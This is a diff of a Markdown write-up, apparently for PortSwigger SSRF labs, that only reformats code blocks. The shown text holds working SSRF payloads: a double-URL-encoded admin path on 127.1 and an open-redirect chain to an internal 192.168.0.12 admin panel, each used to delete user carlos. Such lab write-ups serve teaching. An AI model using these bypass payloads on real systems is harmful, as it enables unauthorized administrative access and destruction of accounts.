@@ -184,10 +184,9 @@ http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
 #### Final Step – Deleting the User
 
 - I appended the delete endpoint to the request:
+
 ```http
-
   http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
-
 ```
 - I sent the request, and the user `carlos` was deleted.
 
@@ -213,11 +212,10 @@ http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
 - I intercepted the **Check Stock** request on the product page using **Burp Suite**.
 - I attempted to directly access the admin panel via:
 
-```http
+ ```http
+ http://192.168.0.12:8080/admin 
+ ```
 
-http://192.168.0.12:8080/admin
-
-```
 - The server returned an error:
 
 
@@ -236,6 +234,7 @@ Invalid external stock check url 'Invalid URL'
 #### 2.1. **Checked the Stock Check Endpoint**
 
 - I URL-decoded the stock check request:
+
 ```http
    /product/stock/check?productId=1&storeId=1
 ```
@@ -270,8 +269,8 @@ Invalid external stock check url 'Invalid URL'
 - Now provide the redirect path `/product/nextProduct?path=http://192.168.0.12:8080/admin` to the stockApi parameter from the full uri `/product/nextProduct?currentProductId=1&path=/product?productId=2`).
 
 We get a `200 OK` response & we can able to access the admin panel.
-```http
 
+```http
 /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
 ```
 
@@ -282,11 +281,11 @@ We get a `200 OK` response & we can able to access the admin panel.
 ### 3.2. **URL Encoded the Redirect Endpoint**
 
 - I encoded the entire redirect URL:
+
 ```http
-
 /product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin
-
 ```
+
 - Replaced `stockApi` with the encoded payload.
 
 ![image](https://github.com/user-attachments/assets/0c8582ef-1a14-4f7a-8d4a-312adfeafbd6)
@@ -295,18 +294,16 @@ We get a `200 OK` response & we can able to access the admin panel.
 #### 3.3. **Success: Admin Interface Accessed**
 
 - This returned a `200 OK` response, along with:
+
 ```http
-
 /delete?username=carlos
-
 ```
 
 
 - I appended the delete endpoint to the stockApi:
+
 ```http
-
 /product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos
-
 ```
 - Sent the request, and the user `carlos` was deleted.
 
@@ -316,3 +313,4 @@ We get a `200 OK` response & we can able to access the admin panel.
 
 
 ---
+
